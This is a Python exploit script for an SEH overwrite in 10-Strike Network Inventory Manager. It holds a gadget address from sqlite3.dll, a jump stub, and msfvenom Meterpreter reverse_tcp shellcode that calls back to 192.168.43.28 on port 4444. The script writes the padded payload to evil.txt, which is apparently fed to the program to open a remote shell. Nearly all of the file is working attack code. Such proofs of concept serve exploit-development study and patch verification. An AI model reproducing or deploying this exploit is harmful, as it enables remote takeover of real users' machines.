#Created by: Uday Mittal (Yaksas CSC)

#This code exploits the SEH overwrite vulnerability in 10-Strike Network Inventory Manager.

# 0x61e85ec2 : pop esi # pop ebp # ret  |  {PAGE_EXECUTE_READ} [sqlite3.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.12.2 (C:\Program Files\10-Strike Network Inventory Explorer\sqlite3.dll)

# short jump jmp $+20 - EB12

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.28 LPORT=4444 -b '\x00\x0A\x0D' -f python - 368 bytes

import sys

buf =  ""
buf += "\xda\xc1\xd9\x74\x24\xf4\xbe\xb6\x06\xc4\xd8\x5d\x2b"
buf += "\xc9\xb1\x56\x31\x75\x18\x83\xed\xfc\x03\x75\xa2\xe4"
buf += "\x31\x24\x22\x6a\xb9\xd5\xb2\x0b\x33\x30\x83\x0b\x27"
buf += "\x30\xb3\xbb\x23\x14\x3f\x37\x61\x8d\xb4\x35\xae\xa2"
buf += "\x7d\xf3\x88\x8d\x7e\xa8\xe9\x8c\xfc\xb3\x3d\x6f\x3d"
buf += "\x7c\x30\x6e\x7a\x61\xb9\x22\xd3\xed\x6c\xd3\x50\xbb"
buf += "\xac\x58\x2a\x2d\xb5\xbd\xfa\x4c\x94\x13\x71\x17\x36"
buf += "\x95\x56\x23\x7f\x8d\xbb\x0e\xc9\x26\x0f\xe4\xc8\xee"
buf += "\x5e\x05\x66\xcf\x6f\xf4\x76\x17\x57\xe7\x0c\x61\xa4"
buf += "\x9a\x16\xb6\xd7\x40\x92\x2d\x7f\x02\x04\x8a\x7e\xc7"
buf += "\xd3\x59\x8c\xac\x90\x06\x90\x33\x74\x3d\xac\xb8\x7b"
buf += "\x92\x25\xfa\x5f\x36\x6e\x58\xc1\x6f\xca\x0f\xfe\x70"
buf += "\xb5\xf0\x5a\xfa\x5b\xe4\xd6\xa1\x33\xc9\xda\x59\xc3"
buf += "\x45\x6c\x29\xf1\xca\xc6\xa5\xb9\x83\xc0\x32\xc8\x84"
buf += "\xf2\xed\x72\xc4\x0c\x0e\x82\xcc\xca\x5a\xd2\x66\xfa"
buf += "\xe2\xb9\x76\x03\x37\x57\x7d\x93\x78\x0f\xaa\x7f\x11"
buf += "\x4d\xad\x6e\xbd\xd8\x4b\xc0\x6d\x8a\xc3\xa1\xdd\x6a"
buf += "\xb4\x49\x34\x65\xeb\x6a\x37\xac\x84\x01\xd8\x18\xfc"
buf += "\xbd\x41\x01\x76\x5f\x8d\x9c\xf2\x5f\x05\x14\x02\x11"
buf += "\xee\x5d\x10\x46\x89\x9d\xe8\x97\x3c\x9d\x82\x93\x96"
buf += "\xca\x3a\x9e\xcf\x3c\xe5\x61\x3a\x3f\xe2\x9e\xbb\x09"
buf += "\x98\xa9\x29\x35\xf6\xd5\xbd\xb5\x06\x80\xd7\xb5\x6e"
buf += "\x74\x8c\xe6\x8b\x7b\x19\x9b\x07\xee\xa2\xcd\xf4\xb9"
buf += "\xca\xf3\x23\x8d\x54\x0c\x06\x8d\x93\xf2\xd4\xba\x3b"
buf += "\x9a\x26\xfb\xbb\x5a\x4d\xfb\xeb\x32\x9a\xd4\x04\xf2"
buf += "\x63\xff\x4c\x9a\xee\x6e\x3e\x3b\xee\xba\x9e\xe5\xef"
buf += "\x49\x3b\x16\x95\x22\xbc\xd7\x6a\x2b\xd9\xd8\x6a\x53"
buf += "\xdf\xe5\xbc\x6a\x95\x28\x7d\xc9\xa6\x1f\x20\x78\x2d"
buf += "\x5f\x76\x7a\x64"


evilString = "\x90" * 4188 + "\xEB\x12\x90\x90" + "\xC2\x5E\xe8\x61" + "\x90" * 100 + buf + "\x90" *1332


filename = "evil.txt"

textfile = open(filename,'w')
textfile.write(evilString)
textfile.close()
